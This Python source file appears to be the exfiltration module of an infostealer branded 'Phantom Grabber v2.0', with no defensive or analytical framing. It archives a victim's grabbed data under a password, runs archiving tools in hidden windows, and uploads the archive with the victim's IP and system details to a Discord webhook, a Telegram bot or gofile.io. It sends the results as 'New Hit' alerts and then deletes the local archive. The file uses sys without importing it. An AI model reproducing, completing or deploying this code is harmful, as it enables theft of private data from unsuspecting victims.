import os
import json
import zipfile
import subprocess
import logging
import time

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Exfiltrator:
    _log = logging.getLogger('Exfiltrator')

    @staticmethod
    def CreateArchive(source_dir: str, output_path: str, password: str) -> str:
        # Try bundled rar.exe (PyInstaller _MEIPASS) first
        bundled_rar = os.path.join(getattr(sys, '_MEIPASS', ''), 'rar.exe')
        rar_candidates = [bundled_rar] if os.path.isfile(bundled_rar) else []
        rar_candidates += [
            r'C:\Program Files\WinRAR\rar.exe',
            r'C:\Program Files (x86)\WinRAR\rar.exe',
        ]

        for rar_path in rar_candidates:
            if os.path.isfile(rar_path):
                try:
                    rar_output = output_path.replace('.zip', '.rar')
                    cmd = [rar_path, 'a', f'-hp{password}', '-ep1', '-m5', rar_output, source_dir]
                    result = subprocess.run(cmd, capture_output=True, timeout=120,
                                            creationflags=subprocess.CREATE_NO_WINDOW)
                    if result.returncode == 0 and os.path.isfile(rar_output):
                        Exfiltrator._log.info(f'Archive created with RAR: {rar_output}')
                        return rar_output
                except Exception:
                    pass
                break

        # Try 7-Zip for password-protected zip
        seven_z_paths = [
            r'C:\Program Files\7-Zip\7z.exe',
            r'C:\Program Files (x86)\7-Zip\7z.exe',
            os.path.join(os.getenv('ProgramFiles', ''), '7-Zip', '7z.exe'),
        ]

        for sz_path in seven_z_paths:
            if os.path.isfile(sz_path):
                try:
                    cmd = [sz_path, 'a', f'-p{password}', '-tzip', '-mx=5', output_path,
                           os.path.join(source_dir, '*')]
                    result = subprocess.run(cmd, capture_output=True, timeout=120,
                                            creationflags=subprocess.CREATE_NO_WINDOW)
                    if result.returncode == 0 and os.path.isfile(output_path):
                        Exfiltrator._log.info(f'Archive created with 7z: {output_path}')
                        return output_path
                except Exception:
                    pass
                break

        # Fallback: regular zip (no password encryption — Python zipfile limitation)
        try:
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(source_dir):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        arcname = os.path.relpath(fpath, source_dir)
                        try:
                            zf.write(fpath, arcname)
                        except Exception:
                            continue
            Exfiltrator._log.info(f'Archive created (no password): {output_path}')
            return output_path
        except Exception as e:
            Exfiltrator._log.error(f'Archive creation failed: {e}')
            return output_path

    @staticmethod
    def UploadToExternalService(filepath: str, filename: str) -> str | None:
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')

        # Get best server
        try:
            resp = http.request('GET', 'https://api.gofile.io/servers', timeout=15.0)
            if resp.status != 200:
                return None
            data = json.loads(resp.data.decode('utf-8'))
            if data.get('status') != 'ok':
                return None
            servers = data.get('data', {}).get('servers', [])
            if not servers:
                return None
            server = servers[0].get('name', 'store1')
        except Exception as e:
            Exfiltrator._log.debug(f'Gofile server fetch failed: {e}')
            return None

        # Upload file
        try:
            with open(filepath, 'rb') as f:
                file_data = f.read()

            # Build multipart body manually
            boundary = f'----PhantomBoundary{int(time.time())}'
            body = b''
            body += f'--{boundary}\r\n'.encode()
            body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode()
            body += b'Content-Type: application/octet-stream\r\n\r\n'
            body += file_data
            body += f'\r\n--{boundary}--\r\n'.encode()

            resp = http.request(
                'POST',
                f'https://{server}.gofile.io/contents',
                body=body,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                timeout=300.0
            )

            if resp.status == 200:
                result = json.loads(resp.data.decode('utf-8'))
                if result.get('status') == 'ok':
                    download_url = result.get('data', {}).get('downloadPage', '')
                    Exfiltrator._log.info(f'Uploaded to gofile: {download_url}')
                    return download_url
        except Exception as e:
            Exfiltrator._log.debug(f'Gofile upload failed: {e}')

        return None

    @staticmethod
    def SendDiscordWebhook(archive_path: str, filename: str, ip_info: str,
                           system_info: str, grabbed_info: str) -> None:
        webhook_url = Settings.C2[1]
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')

        # Build embed
        embed = {
            'title': '👻 Phantom Grabber — New Hit',
            'color': 0x7B2FBE,
            'fields': [
                {'name': '🌐 IP Info', 'value': f'```\n{ip_info[:1000]}\n```', 'inline': False},
                {'name': '💻 System', 'value': f'```\n{system_info[:1000]}\n```', 'inline': False},
                {'name': '📦 Grabbed', 'value': f'```\n{grabbed_info[:1000]}\n```', 'inline': False},
            ],
            'footer': {'text': 'Phantom Grabber v2.0'},
        }

        content = ''
        if Settings.PingMe:
            content = '@everyone'

        file_size = os.path.getsize(archive_path) if os.path.isfile(archive_path) else 0

        if file_size > 25 * 1024 * 1024:
            # Too large for Discord — upload to gofile
            gofile_url = Exfiltrator.UploadToExternalService(archive_path, filename)
            if gofile_url:
                embed['fields'].append({
                    'name': '📁 Download',
                    'value': f'[GoFile Link]({gofile_url})',
                    'inline': False
                })

            payload = json.dumps({'content': content, 'embeds': [embed]}).encode('utf-8')
            try:
                http.request('POST', webhook_url, body=payload,
                             headers={'Content-Type': 'application/json'}, timeout=30.0)
                Exfiltrator._log.info('Discord webhook sent (gofile link)')
            except Exception as e:
                Exfiltrator._log.error(f'Discord webhook failed: {e}')
        else:
            # Attach file directly via multipart
            boundary = f'----PhantomBoundary{int(time.time())}'
            payload_json = json.dumps({'content': content, 'embeds': [embed]})

            body = b''
            # Payload JSON part
            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="payload_json"\r\n'
            body += b'Content-Type: application/json\r\n\r\n'
            body += payload_json.encode('utf-8')
            body += b'\r\n'

            # File part
            if os.path.isfile(archive_path):
                with open(archive_path, 'rb') as f:
                    file_data = f.read()
                body += f'--{boundary}\r\n'.encode()
                body += f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode()
                body += b'Content-Type: application/octet-stream\r\n\r\n'
                body += file_data
                body += b'\r\n'

            body += f'--{boundary}--\r\n'.encode()

            try:
                http.request('POST', webhook_url, body=body,
                             headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                             timeout=120.0)
                Exfiltrator._log.info('Discord webhook sent with attachment')
            except Exception as e:
                Exfiltrator._log.error(f'Discord webhook failed: {e}')

    @staticmethod
    def SendTelegram(archive_path: str, filename: str, ip_info: str,
                     system_info: str, grabbed_info: str) -> None:
        # Settings.C2[1] format: "bot_token$chat_id"
        parts = Settings.C2[1].split('$', 1)
        if len(parts) != 2:
            Exfiltrator._log.error('Invalid Telegram C2 config')
            return

        bot_token, chat_id = parts
        http = urllib3.PoolManager(cert_reqs='CERT_NONE')
        base_url = f'https://api.telegram.org/bot{bot_token}'

        caption = (
            f'<b>👻 Phantom Grabber — New Hit</b>\n\n'
            f'<b>🌐 IP Info:</b>\n<pre>{ip_info[:800]}</pre>\n\n'
            f'<b>💻 System:</b>\n<pre>{system_info[:800]}</pre>\n\n'
            f'<b>📦 Grabbed:</b>\n<pre>{grabbed_info[:800]}</pre>'
        )

        file_size = os.path.getsize(archive_path) if os.path.isfile(archive_path) else 0

        if file_size > 40 * 1024 * 1024:
            # Too large for Telegram — upload to gofile
            gofile_url = Exfiltrator.UploadToExternalService(archive_path, filename)
            download_note = f'\n\n<b>📁 Download:</b> {gofile_url}' if gofile_url else ''
            message_text = caption + download_note

            try:
                payload = json.dumps({
                    'chat_id': chat_id,
                    'text': message_text,
                    'parse_mode': 'HTML',
                }).encode('utf-8')
                http.request('POST', f'{base_url}/sendMessage', body=payload,
                             headers={'Content-Type': 'application/json'}, timeout=30.0)
                Exfiltrator._log.info('Telegram message sent (gofile link)')
            except Exception as e:
                Exfiltrator._log.error(f'Telegram sendMessage failed: {e}')
        else:
            # Send document directly
            boundary = f'----PhantomBoundary{int(time.time())}'
            body = b''

            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="chat_id"\r\n\r\n'
            body += chat_id.encode('utf-8')
            body += b'\r\n'

            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="caption"\r\n\r\n'
            body += caption.encode('utf-8')
            body += b'\r\n'

            body += f'--{boundary}\r\n'.encode()
            body += b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n'
            body += b'HTML\r\n'

            if os.path.isfile(archive_path):
                with open(archive_path, 'rb') as f:
                    file_data = f.read()
                body += f'--{boundary}\r\n'.encode()
                body += f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode()
                body += b'Content-Type: application/octet-stream\r\n\r\n'
                body += file_data
                body += b'\r\n'

            body += f'--{boundary}--\r\n'.encode()

            try:
                http.request('POST', f'{base_url}/sendDocument', body=body,
                             headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                             timeout=120.0)
                Exfiltrator._log.info('Telegram document sent')
            except Exception as e:
                Exfiltrator._log.error(f'Telegram sendDocument failed: {e}')

    @classmethod
    def run(cls, temp_dir: str) -> None:
        # Gather summary info
        ip_info = SystemInfo.get_ip_info()
        system_info = SystemInfo.get_system_summary()

        # Build grabbed summary by counting files in subdirs
        grabbed_parts: list[str] = []
        for subdir in os.listdir(temp_dir):
            subpath = os.path.join(temp_dir, subdir)
            if os.path.isdir(subpath):
                file_count = sum(1 for _, _, fs in os.walk(subpath) for _ in fs)
                if file_count > 0:
                    grabbed_parts.append(f'{subdir}: {file_count} file(s)')

        grabbed_info = '\n'.join(grabbed_parts) if grabbed_parts else 'No data collected'

        # Create archive
        try:
            username = os.getlogin()
        except Exception:
            username = os.getenv('USERNAME', 'user')

        archive_name = f'{username}_phantom.zip'
        archive_path = os.path.join(os.getenv('temp', os.path.dirname(temp_dir)), archive_name)

        archive_path = cls.CreateArchive(temp_dir, archive_path, Settings.ArchivePassword)

        # Send via configured C2 channel
        match Settings.C2[0]:
            case 0:
                cls.SendDiscordWebhook(archive_path, archive_name, ip_info, system_info, grabbed_info)
            case 1:
                cls.SendTelegram(archive_path, archive_name, ip_info, system_info, grabbed_info)
            case _:
                cls._log.error(f'Unknown C2 type: {Settings.C2[0]}')

        # Cleanup archive
        try:
            if os.path.isfile(archive_path):
                os.remove(archive_path)
        except Exception:
            pass

        cls._log.info('Exfiltration complete')
